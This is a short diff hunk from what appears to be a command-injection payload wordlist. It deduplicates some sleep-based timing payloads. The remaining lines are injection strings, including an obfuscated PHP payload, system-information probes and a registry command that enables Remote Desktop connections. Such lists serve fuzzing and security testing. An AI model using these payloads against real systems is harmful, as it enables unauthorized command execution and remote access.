@@ -109,9 +109,7 @@ $_=[];$_=@"$_";$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_[4];$_++;$_++;$_++;$__ .
 & ping -n 30 127.0.0.1 &
 & pwd
 & reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f
-& sleep 1
-& sleep 10 
-& sleep 15 
+& sleep 10
 & sleep 5
 & sysinfo
 & system('sleep 5');
